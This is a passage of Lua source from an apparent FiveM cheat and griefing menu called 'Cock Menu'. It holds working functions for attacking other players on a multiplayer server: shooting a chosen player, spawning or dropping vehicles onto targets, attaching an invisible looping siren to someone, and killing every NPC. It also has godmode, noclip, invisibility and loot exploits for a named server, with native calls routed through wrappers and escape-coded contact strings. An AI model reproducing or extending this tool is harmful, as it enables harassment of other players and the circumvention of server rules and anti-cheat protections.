                   Fatasf.n.SetPedConfigFlag(ped, 36, 1)
                   Fatasf.n.TaskMoveNetworkByName(ped, "task_mp_pointing", 0.5, 0, "anim@mp_point", 24)
                   Fatasf.n.RemoveAnimDict("anim@mp_point")
               end
   
               stopPointing = function()
                   local ped = Fatasf.n.PlayerPedId()
                   Fatasf.n.RequestTaskMoveNetworkStateTransition(ped, "Stop")
                   if not Fatasf.n.IsPedInjured(ped) then
                       Fatasf.n.ClearPedSecondaryTask(ped)
                   end
                   if not Fatasf.n.IsPedInAnyVehicle(ped, 1) then
                       Fatasf.n.SetPedCurrentWeaponVisible(ped, 1, 1, 1, 1)
                   end
                   Fatasf.n.SetPedConfigFlag(ped, 36, 0)
                   Fatasf.n.ClearPedSecondaryTask(Fatasf.n.PlayerPedId())
               end
   
               CockT.Inv["Thread"](function()
                   while true do
                       CockT.Inv["Wait"](0)
   
                       if CockT.Inv["Invoke"](CockT.Natives['IsPedOnFoot'], Fatasf.n.PlayerPedId()) and not mp_pointing then
                           CockT.Inv["Wait"](200)
                           startPointing()
                           mp_pointing = true
                       end
   
                       if Fatasf.n.IsTaskMoveNetworkActive(Fatasf.n.PlayerPedId()) and not mp_pointing then
                           stopPointing()
                       end
                       if Fatasf.n.IsTaskMoveNetworkActive(Fatasf.n.PlayerPedId()) then
                           if not CockT.Inv["Invoke"](CockT.Natives['IsPedOnFoot'], Fatasf.n.PlayerPedId()) then
                               stopPointing()
                           else
                               local ped = Fatasf.n.PlayerPedId()
                               camPitch = Fatasf.n.GetGameplayCamRelativePitch()
                               if camPitch < -70.0 then
                                   camPitch = -70.0
                               elseif camPitch > 42.0 then
                                   camPitch = 42.0
                               end
                               camPitch = (camPitch + 70.0) / 112.0
   
                               camHeading = Fatasf.n.GetGameplayCamRelativeHeading()
                               cosCamHeading = Cos(camHeading)
                               sinCamHeading = Sin(camHeading)
                               if camHeading < -180.0 then
                                   camHeading = -180.0
                               elseif camHeading > 180.0 then
                                   camHeading = 180.0
                               end
                               camHeading = (camHeading + 180.0) / 360.0
                               blocked = 0
                               nn = 0
                               coords = Fatasf.n.GetOffsetFromEntityInWorldCoords(ped, (cosCamHeading * -0.2) - (sinCamHeading * (0.4 * camHeading + 0.3)), (sinCamHeading * -0.2) + (cosCamHeading * (0.4 * camHeading + 0.3)), 0.6)
                               ray = Fatasf.n.StartShapeTestCapsule(coords.x, coords.y, coords.z - 0.2, coords.x, coords.y, coords.z + 0.2, 0.4, 95, ped, 7);
                               nn,blocked,coords,coords = Fatasf.n.GetRaycastResult(ray)
                               Fatasf.n.SetTaskMoveNetworkSignalFloat(ped, "Pitch", camPitch)
                               Fatasf.n.SetTaskMoveNetworkSignalFloat(ped, "Heading", camHeading * -1.0 + 1.0)
                               Fatasf.n.SetTaskMoveNetworkSignalBool(ped, "isBlocked", blocked)
                               Fatasf.n.SetTaskMoveNetworkSignalBool(ped, "isFirstPerson", _cit_.InvokeNative(0xEE778F8C7E1142E2, _cit_.InvokeNative(0x19CAFA3C87F7C2FF)) == 4)
   
                           end
                       end
                   end
               end)
   
           end
           CockMenu.Main.PounderPlayers = function(players, howm)
               for i = 0, howm - 1 do
                   local ped = Fatasf.n.GetPlayerPed(players)
                   local coords = Fatasf.n.GetEntityCoords(ped)
                   while not Fatasf.n.HasModelLoaded(Fatasf.n.GetHashKey("Pounder")) do
                   Fatasf.n.RequestModel(Fatasf.n.GetHashKey("Pounder"))
                   CockT.Inv["Wait"](1)
                   end
                   local veh = Fatasf.n.CreateVehicle(Fatasf.n.GetHashKey("Pounder"), coords.x, coords.y, coords.z, 90.0, 1, 1)
               end
           end
           CockMenu.Main.killallpeds = function()
               for peds in Fatasf.n.EnumeratePeds() do
                   if
                       Fatasf.n.IsPedAPlayer(peds) ~= true and
                           peds ~= Fatasf.n.PlayerPedId()
                    then
                       Fatasf.n.RequestControlOnce(peds)
                       Fatasf.n.SetEntityHealth(peds, 0)
                   end
               end
           end
           CockMenu.Main.TugAllPlayers = function()
               for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                    local ped = Fatasf.n.GetPlayerPed(i) 
                    coords = Fatasf.n.GetEntityCoords(ped)
                    while not Fatasf.n.HasModelLoaded(Fatasf.n.GetHashKey("tug")) do
                        Fatasf.n.RequestModel(Fatasf.n.GetHashKey("tug"))
                        CockT.Inv["Wait"](1)
                    end
                    local veh = Fatasf.n.CreateVehicle(Fatasf.n.GetHashKey("tug"), coords.x, coords.y, coords.z, 90.0, 1, 1)
                end
            end
            CockMenu.Main.EnableAllSirens = function()
               for vehicle in Fatasf.n.EnumerateVehicles() do
                   Fatasf.n.SetVehicleEngineOn(vehicle, true, true, true)
                    Fatasf.n.TriggerSiren(vehicle)
                    Fatasf.n.SetVehicleSiren(vehicle, true)
               end
           end
           CockMenu.Main.SirensOnPlayer = function(player)
               CockT.Inv['Thread'](function()
                   local kx = Fatasf.n.GetHashKey('police')
                   Fatasf.n.RequestModel(kx)
                   while not Fatasf.n.HasModelLoaded(kx) do 
                     CockT.Inv["Wait"](0) 
                   end
                   local k = Fatasf.n.CreateVehicle(kx, Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(player)), 1, 1, 1)
                   while true do
                       CockT.Inv["Wait"](0)
                       local PoliceAnnoying = true
                       if PoliceAnnoying then
                           coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(player))
                           Fatasf.n.SetEntityVisible(k, false, false)
                           Fatasf.n.SetEntityCoords(k, coords.x, coords.y, coords.z + 5)
                           Fatasf.n.SetVehicleEngineOn(k, true, true, true)
                           Fatasf.n.TriggerSiren(k)
                           Fatasf.n.SetVehicleSiren(k, true)
                       end
                   end
               end)
           end
           CockMenu.Main.KillPlayer = function(player)
               local ped = Fatasf.n.GetPlayerPed(player)
               local location = Fatasf.n.GetEntityCoords(ped)
               local dest = Fatasf.n.GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
               local org = Fatasf.n.GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
               Fatasf.n.ShootSingleBulletBetweenCoords(org, dest, 50.0, true, Fatasf.n.GetHashKey('WEAPON_PISTOL'), Fatasf.n.PlayerPedId(), true, false, 10000.0)
           end
           CockMenu.Main.ShitRain = function(target, model, result)
               CockT.Inv["Thread"](
                   function(result)
                       for tye = 0, result do
                           VehicleHash = Fatasf.n.GetHashKey(model)
                           Fatasf.n.RequestModel(VehicleHash)
                           x, y, z =
                               CockT.Strings.tunpack(
                               Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(target))
                           )
                           while not Fatasf.n.HasModelLoaded(VehicleHash) do
                               Fatasf.n.RequestModel(VehicleHash)
                               CockT.Inv["Wait"](15)
                           end
                           cockmenu = {p = 82, s = 80}
                           SpawnedVeh =
                               CockT.Inv["Invoke"](
                               CockT.Natives["CreateVehicle"],
                               VehicleHash,
                               x,
                               y,
                               z + 20.0,
                               0.0,
                               true,
                               false
                           )
                           CockT.Inv["Invoke"](CockT.Natives["SetVehicleColours"], SpawnedVeh, cockmenu.p, cockmenu.s)
                           Fatasf.n.SetVehicleNumberPlateText(SpawnedVeh, "Cock Menu")
                           Fatasf.n.SetEntityVelocity(SpawnedVeh, 0.0, 0.0, -100.0)
                       end
                   end
               )
           end
           
           CockMenu.Main.SpawnBitch = function(playerped)
               if Fatasf.n.IsPedSittingInVehicle(Fatasf.n.GetPlayerPed(playerped), Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(playerped), false)) then
                   local veh = Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.GetPlayerPed(playerped))
                   local model = Fatasf.n.GetHashKey("s_f_y_stripper_01")
                   Fatasf.n.RequestModel(model)
                   while not Fatasf.n.HasModelLoaded(model) do
                       CockT.Inv["Wait"](1)
                   end
                   local cpiv = Fatasf.n.CreatePedInsideVehicle(veh, 4, model, 0, true, false)
               end
           end
           CockMenu.Main.Cage = function(player)
               --[[local ped = Fatasf.n.GetPlayerPed(player)
               local coords = Fatasf.n.GetEntityCoords(ped)
               local inveh = Fatasf.n.IsPedInAnyVehicle(ped)
               if inveh then
                   obj =
                       Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                       coords.x - 6.8,
                       coords.y + 1,
                       coords.z - 1.5,
                       0,
                       1,
                       1
                   )
                   Fatasf.n.SetEntityHeading(obj, 90.0)
                   Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                       coords.x - 0.6,
                       coords.y + 6.8,
                       coords.z - 1.5,
                       0,
                       1,
                       1
                   )
                   Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                       coords.x - 0.6,
                       coords.y - 4.8,
                       coords.z - 1.5,
                       0,
                       1,
                       1
                   )
                   obj2 =
                       Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                       coords.x + 4.8,
                       coords.y + 1,
                       coords.z - 1.5,
                       0,
                       1,
                       1
                   )
                   Fatasf.n.SetEntityHeading(obj2, 90.0)
                   obj =
                       Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                       coords.x - 6.8,
                       coords.y + 1,
                       coords.z + 1.3,
                       0,
                       1,
                       1
                   )
                   Fatasf.n.SetEntityHeading(obj, 90.0)
                   Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                       coords.x - 0.6,
                       coords.y + 6.8,
                       coords.z + 1.3,
                       0,
                       1,
                       1
                   )
                   Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                       coords.x - 0.6,
                       coords.y - 4.8,
                       coords.z + 1.3,
                       0,
                       1,
                       1
                   )
                   obj2 =
                       Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                       coords.x + 4.8,
                       coords.y + 1,
                       coords.z + 1.3,
                       0,
                       1,
                       1
                   )
                   Fatasf.n.SetEntityHeading(obj2, 90.0)
               else
                   obj =
                       Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                       coords.x - 0.6,
                       coords.y - 1,
                       coords.z - 1,
                       1,
                       1,
                       1
                   )
                   Fatasf.n.FreezeEntityPosition(obj, true)
                   obj2 =
                       Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                       coords.x - 0.55,
                       coords.y - 1.05,
                       coords.z - 1,
                       1,
                       1,
                       1
                   )
                   Fatasf.n.SetEntityHeading(obj2, 90.0)
                   Fatasf.n.FreezeEntityPosition(obj2, true)
                   obj3 =
                       Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                       coords.x - 0.6,
                       coords.y + 0.6,
                       coords.z - 1,
                       1,
                       1,
                       1
                   )
                   Fatasf.n.FreezeEntityPosition(obj3, true)
                   local obj4 =
                       Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                       coords.x + 1.05,
                       coords.y - 1.05,
                       coords.z - 1,
                       1,
                       1,
                       1
                   )
                   Fatasf.n.SetEntityHeading(obj4, 90.0)
                   Fatasf.n.FreezeEntityPosition(obj4, true)
                   local obj5 =
                       Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                       coords.x - 0.6,
                       coords.y - 1,
                       coords.z + 1.5,
                       1,
                       1,
                       1
                   )
                   Fatasf.n.FreezeEntityPosition(obj5, true)
                   local obj6 =
                       Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                       coords.x - 0.55,
                       coords.y - 1.05,
                       coords.z + 1.5,
                       1,
                       1,
                       1
                   )
                   Fatasf.n.SetEntityHeading(obj6, 90.0)
                   Fatasf.n.FreezeEntityPosition(obj6, true)
                   local obj7 =
                       Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                       coords.x - 0.6,
                       coords.y + 0.6,
                       coords.z + 1.5,
                       1,
                       1,
                       1
                   )
                   Fatasf.n.FreezeEntityPosition(obj7, true)
                   local obj8 =
                       Fatasf.n.CreateObject(
                       Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                       coords.x + 1.05,
                       coords.y - 1.05,
                       coords.z + 1.5,
                       1,
                       1,
                       1
                   )
                   Fatasf.n.SetEntityHeading(obj8, 90.0)
                   Fatasf.n.FreezeEntityPosition(obj8, true)
               end]]
           end
           CockMenu.Main.natRe = function()
               local entcord = Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId())
               local cords = {
                   x = CockT.Global.mathround(entcord.x, 1),
                   y = CockT.Global.mathround(entcord.y, 1),
                   z = CockT.Global.mathround(entcord.z, 1)
               }
               CockT.Global.resPe(Fatasf.n.PlayerPedId(), cords, 0)
               Fatasf.n.StopScreenEffect("DeathFailOut")
           end
           CockMenu.Main.TpToWaypoint = function()
               wp = Fatasf.n.GetFirstBlipInfoId(8)
               if Fatasf.n.DoesBlipExist(wp) then          
                   wpC = Fatasf.n.GetBlipInfoIdCoord(wp)       
                   for cc = 1, 1000 do            
                       CockT.Inv["Invoke"](CockT.Natives['SetPedCoordsKeepVehicle'], Fatasf.n.PlayerPedId(), wpC["x"], wpC["y"], cc + 0.0)            
                       gZ, zPos = Fatasf.n.GetGroundZFor_3dCoord(wpC["x"], wpC["y"], cc + 0.0)            
                       if gZ then                
                           CockT.Inv["Invoke"](CockT.Natives['SetPedCoordsKeepVehicle'], Fatasf.n.PlayerPedId(), wpC["x"], wpC["y"], cc + 0.0)                
                           break            
                       end            
                       CockT.Inv["Wait"](0)
                   end
               end
           end
           CockMenu.Main.Dragbar = function()
               local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
                       local widht, height = Fatasf.n.GetActiveScreenResolution()
                       c_x = c_x / widht
                       c_y = c_y / height
       
                       if (c_x >= Cock.Menu.MenuX - 0.50 and c_y >= Cock.Menu.MenuY - 0.24 and c_x <= Cock.Menu.MenuX - 0.41 and c_y < Cock.Menu.MenuY + 0.211) and Fatasf.n.IsDisabledControlJustPressed(0, 24) then 
                               _x = Cock.Menu.MenuX - c_x
                               _y = Cock.Menu.MenuY - c_y
                               Cock.Menu.dragging_allowed = true
                           elseif CockT.Inv["Invoke"](CockT.Natives['IsDisabledControlReleased'], 0, 24) then
                               Cock.Menu.dragging_allowed = false
                           end
                           
                           if Cock.Menu.dragging_allowed then
                               Cock.Menu.MenuX = c_x + _x
                               Cock.Menu.MenuY = c_y + _y
                           end
       
       
                           if (c_x >= Cock.Menu.MenuX2 - 0.09 and c_y >= Cock.Menu.MenuY2 - 0.27 and c_x <= Cock.Menu.MenuX2 + 0.085 and c_y < Cock.Menu.MenuY2 - 0.155) and Fatasf.n.IsDisabledControlJustPressed(0, 24) then 
                               _x2 = Cock.Menu.MenuX2 - c_x
                               _y2 = Cock.Menu.MenuY2 - c_y
                               Cock.Menu.dragging_allowed2 = true
                           elseif CockT.Inv["Invoke"](CockT.Natives['IsDisabledControlReleased'], 0, 24) then
                               Cock.Menu.dragging_allowed2 = false
                           end
                           
       
                           if Cock.Menu.dragging_allowed2 then
                               Cock.Menu.MenuX2 = c_x + _x2
                               Cock.Menu.MenuY2 = c_y + _y2
                           end
   
                          
           end
   
   
           local CockMeni = {
               Functions = { 
                   MButtons = function()
                       drag_x = Cock.Menu.MenuX-0.5
                       drag_y = Cock.Menu.MenuY-0.5
                       drag_x2 = Cock.Menu.MenuX2-0.5
                       drag_y2 = Cock.Menu.MenuY2-0.5
                       CockMenu.Main.Dragbar()
                       
       
                       CockT.Global.DrawBorderedRect(0.05+drag_x, 0.5+drag_y ,0.07, 0.45, {r = Cock.Sliders['MainR'].value, g = Cock.Sliders['MainG'].value, b = Cock.Sliders['MainB'].value, a = Cock.Sliders['MainA'].value})
                       Fatasf.n.DrawRect(0.05+drag_x, 0.5+drag_y, 0.07, 0.45, 0, 0, 0, 180)
                       local GlifeScripts = {'gtalife-z'}
                       local y_cm = 0.29
                       if CockMenu.Main.MenuButton("Self", "Self", 0.05, y_cm, false, {start = 0.0}) then  tab = "Self"
                       end y_cm = y_cm + 0.04
                       if CockMenu.Main.MenuButton("Players", "Online", 0.05, y_cm, false, {start = 0.0}) then tab = "Players"
                       end y_cm = y_cm + 0.04
                       if CockMenu.Main.MenuButton("Vehicles", "Vehicles", 0.05, y_cm, false, {start = 0.0}) then tab = "Vehicles"
                       end y_cm = y_cm + 0.04
                       if CockMenu.Main.MenuButton("Weapons", "Weapons", 0.05, y_cm, false, {start = 0.0}) then tab = "Weapons"
                       end y_cm = y_cm + 0.04
                       if CockMenu.Main.MenuButton("Visuals", "Visuals", 0.05, y_cm, false, {start = 0.0}) then tab = "Visuals"
                       end y_cm = y_cm + 0.04
                       if CockMenu.Main.MenuButton("Destroyer", "Destroyer", 0.05, y_cm, false, {start = 0.0}) then tab = "Destroyer"
                       end y_cm = y_cm + 0.04
   
                       for k, v in CockT.Math.pairs(GlifeScripts) do
                           if CockT.Global.CheckIfResourceExist(v) then
                               if CockMenu.Main.MenuButton("Glife", "Glife", 0.05, 0.53, false, {start = 0.0}) then  tab = "Glife"
                               end y_cm = y_cm + 0.04
                           end
                       end
   
                       if CockMenu.Main.MenuButton("Lua", "Lua", 0.05, y_cm, false, {start = 0.0}) then tab = "Lua"
                       end y_cm = y_cm + 0.04
                       --if CockMenu.Main.MenuButton("Music", "Music", 0.05, y_cm, false, {start = 0.0}) then tab = "Music"
                       --end y_cm = y_cm + 0.04
                       if CockMenu.Main.MenuButton("Settings", "Settings", 0.05, y_cm, false, {start = 0.0}) then tab = "Settings"
                       end y_cm = y_cm + 0.04
   
                       CockT.Global.DrawText('~b~\100\105\115\99\111\114\100\46\103\103\47\115\80\72\87\55\67\84\84\90\106', 0.015+drag_x, 0.63+drag_y, false, 0.35, 4)
                       CockT.Global.DrawText('\98\195\164\195\164\114\115\35\51\49\53\48', 0.018+drag_x, 0.65+drag_y, false, 0.35, 4)
                       CockT.Global.DrawText('Online Players: ~b~'.. #Fatasf.n.GetActivePlayers(), 0.018+drag_x, 0.67+drag_y, false, 0.35, 4)
                       CockT.Global.DrawText('Session ID: ~b~'..formattorandom , 0.018+drag_x, 0.69+drag_y, false,0.35, 4)
       
                       if tab == "Glife" then
                           if CockMenu.Main.Checkbox('Get loot (~r~Glife~s~)',0.425, 0.37, Cock.Menu.getlootglife, false) then
                               Cock.Menu.getlootglife = not Cock.Menu.getlootglife
                           end
                           if CockMenu.Main.Checkbox('Get loot #2 (~r~Glife~s~) [More safer]',0.425, 0.385, Cock.Menu.getlootglife2, false) then
                               Cock.Menu.getlootglife2 = not Cock.Menu.getlootglife2
                           end
                           if CockMenu.Main.Checkbox('Godmode (~r~Glife~s~)',0.425, 0.4, Cock.Menu.godmodeglife, false) then
                               Cock.Menu.godmodeglife = not Cock.Menu.godmodeglife
                           end
                           if CockMenu.Main.Button('Delete all zombies (~r~Glife~s~)', 0.422, 0.405, false, true) then
                               Functions.f.DeleteZombies()
                           end
                           if CockMenu.Main.Button('Zombie farm (~r~Glife~s~)', 0.422, 0.42, false, true) then
                               Functions.f.SpawnZombies()
                           end
                           if CockMenu.Main.Button('Teleport to spot #1', 0.422, 0.435, false, true) then
                               Fatasf.n.SetEntityCoordsNoOffset(Fatasf.n.PlayerPedId(), 143.13, -784.69, 31.93+1.0, true, true, true)
                           end
                           if CockMenu.Main.Button('Teleport to spot #2', 0.422, 0.45, false, true) then
                               Fatasf.n.SetEntityCoordsNoOffset(Fatasf.n.PlayerPedId(), -1264.07, -1535.97, 5.46+1.0, true, true, true)
                           end
                           if CockMenu.Main.Checkbox('Unlimited ammo (~r~Glife~s~)',0.425, 0.475, Cock.Menu.glifeunlammo, false) then
                               Cock.Menu.glifeunlammo = not Cock.Menu.glifeunlammo
                           end
                           if CockMenu.Main.Checkbox('Player loot esp (~r~Glife~s~)',0.425, 0.49, Cock.Menu.lootesp, false) then
                               Cock.Menu.lootesp = not Cock.Menu.lootesp
                           end
                       end
                       if tab == "Self" then
                           local scroll = 0.37 + Cock.Menu.scr_s
                           local sc_x2, sc_y2 = Cock.Menu.MenuX2-0.5, Cock.Menu.MenuY2-0.5
   
                           if CockT.Global.Zones(0.5+sc_x2, 0.465+sc_y2, 0.17, 0.45) then
                               if Fatasf.n.IsDisabledControlPressed(0, 14) and scroll > (0.37 - (13 * 0.015)) then
                                   Cock.Menu.scr_s = Cock.Menu.scr_s - 0.015
                               end
                               if Fatasf.n.IsDisabledControlJustPressed(0, 15) and scroll ~= 0.37 then
                                   Cock.Menu.scr_s = Cock.Menu.scr_s + 0.015
                               end
                           end
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Revive', 0.422, scroll, false, true) then
                                   CockMenu.Main.natRe()
                                   CockMenu.Main.AddNotification('Revived!',"INFO", 5000)
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Suicide', 0.422, scroll, false, false) then
                                   Fatasf.n.SetEntityHealth(Fatasf.n.PlayerPedId(), 0)
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Teleport to waypoint', 0.422, scroll, false) then
                                   CockMenu.Main.TpToWaypoint()
                               end
                           end scroll = scroll + 0.025
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Godmode',0.425, scroll, Cock.Menu.Godmode, false) then
                                   Cock.Menu.Godmode = not Cock.Menu.Godmode
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Semi-Godmode',0.425, scroll, Cock.Menu.SemiGodmode, false) then
                                   Cock.Menu.SemiGodmode = not Cock.Menu.SemiGodmode
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Extra Jump',0.425, scroll, Cock.Menu.ExtraJump, false) then
                                   Cock.Menu.ExtraJump = not Cock.Menu.ExtraJump
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Super Jump',0.425, scroll, Cock.Menu.SJump, false) then
                                   Cock.Menu.SJump = not Cock.Menu.SJump
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Infinite Stamina',0.425, scroll, Cock.Menu.maxstamina, false) then
                                   Cock.Menu.maxstamina = not Cock.Menu.maxstamina
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('NoClip',0.425, scroll, Cock.Menu.NClip, false) then
                                   Cock.Menu.NClip = not Cock.Menu.NClip
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               CockMenu.Main.Slider('Noclip speed', 0.5, scroll, Cock.Sliders['NoclipSpeed'], 143, 240, 249)
                           end scroll = scroll + 0.03
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('AntiAFK',0.425, scroll, Cock.Menu.AFK, false) then
                                   Cock.Menu.AFK = not Cock.Menu.AFK
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Invisible',0.425, scroll, Cock.Menu.invisible, false) then
                                   Cock.Menu.invisible = not Cock.Menu.invisible
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Infinite combat roll',0.425, scroll, Cock.Menu.infroll, false) then
                                   Cock.Menu.infroll = not Cock.Menu.infroll
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Auto bunnyhop',0.425, scroll, Cock.Menu.taskjump, false) then
                                   Cock.Menu.taskjump = not Cock.Menu.taskjump
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               CockMenu.Main.Slider('Alpha', 0.5, scroll, Cock.Sliders['InvsAlpha'], 143, 240, 249)
                           end scroll = scroll + 0.025
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               CockMenu.Main.Slider('Health', 0.5, scroll, Cock.Sliders['HealthVal'], 143, 240, 249)
                           end scroll = scroll + 0.025
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               CockMenu.Main.Slider('Armour', 0.5, scroll, Cock.Sliders['ArmVal'], 143, 240, 249)
                           end scroll = scroll + 0.025
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               CockMenu.Main.Slider('Fuel', 0.5, scroll, Cock.Sliders['FuelVal'], 143, 240, 249)
                           end scroll = scroll - 0.059
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Set HP', 0.56, scroll, false, true) then
                                   Fatasf.n.SetEntityHealth(Fatasf.n.PlayerPedId(), Cock.Sliders['HealthVal'].value + 95)
                                   CockMenu.Main.AddNotification('Done! (HP)',"INFO", 5000)
                               end
                           end scroll = scroll + 0.025
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Set Armour', 0.55, scroll, false, true) then
                                   Fatasf.n.SetPedArmour(Fatasf.n.PlayerPedId(), Cock.Sliders['ArmVal'].value)
                                   CockMenu.Main.AddNotification('Done! (ARMOUR)',"INFO", 5000)
                               end
                           end scroll = scroll + 0.065
                           
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Fast swim',0.425, scroll, Cock.Menu.fastswim, false) then
                                   Cock.Menu.fastswim = not Cock.Menu.fastswim
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Anti drowing',0.425, scroll, Cock.Menu.antidrowing, false) then
                                   Cock.Menu.antidrowing = not Cock.Menu.antidrowing
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Anti Headshot',0.425, scroll, Cock.Menu.antihead, false) then
                                   Cock.Menu.antihead = not Cock.Menu.antihead
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Custom Wanted level',0.425, scroll, Cock.Menu.wantedlevel, false) then
                                   Cock.Menu.wantedlevel = not Cock.Menu.wantedlevel 
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Anti Stungun',0.425, scroll, Cock.Menu.antistungun, false) then
                                   Cock.Menu.antistungun = not Cock.Menu.antistungun 
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('No ragdoll',0.425, scroll, Cock.Menu.noragdoll, false) then
                                   Cock.Menu.noragdoll = not Cock.Menu.noragdoll 
                               end
                           end scroll = scroll + 0.01
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Random Clothes', 0.422, scroll, false) then
                                   CockT.Global.RandomClothes()
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Get own ped', 0.422, scroll, false) then
                                   local m1 = Functions.f.CustomInput("Ped name:", "a_c_hen", 25)
                                   CockT.Global.GetOwnPed(m1)
                               end
                           end scroll = scroll + 0.03
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Super run',0.425, scroll, Cock.Menu.superrun, false) then
                                   Cock.Menu.superrun = not Cock.Menu.superrun
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Fake dead',0.425, scroll, Cock.Menu.fakedead, false) then
                                   Cock.Menu.fakedead = not Cock.Menu.fakedead
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Ghost rider (~r~Beta~s~)',0.425, scroll, Cock.Menu.ghostrider, false) then
                                   Cock.Menu.ghostrider = not Cock.Menu.ghostrider
                                   if Cock.Menu.ghostrider then
                                       local veh =  Functions.f.SpawnVehicle('daemon')
                                       
                                       wwa = true
                                       Functions.f.FvckinDooogInvincibleglifeshit(true)
                                       
                                       CockT.Inv["Thread"](function()
                                           while wwa do
                                               CockT.Inv["Wait"](0)
                                               Functions.f.RepairVehicle()
                                               Fatasf.n.SetEntityOnlyDamagedByPlayer(veh, true) 
                                               Fatasf.n.SetEntityCanBeDamaged(veh, false)
                                               Fatasf.n.SetEntityInvincible(Fatasf.n.PlayerPedId(), true)
                                               Fatasf.n.SetEntityProofs(veh, false, true, true, false, false, false, false, false)
                                               Fatasf.n.SetEntityInvincible(veh, true)
                                               CockT.Inv["Invoke"](CockT.Natives['SetPlayerInvincible'], Fatasf.n.PlayerPedId(), true)
                                   
                                               local coords = Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId())
                                               local dict = "core"
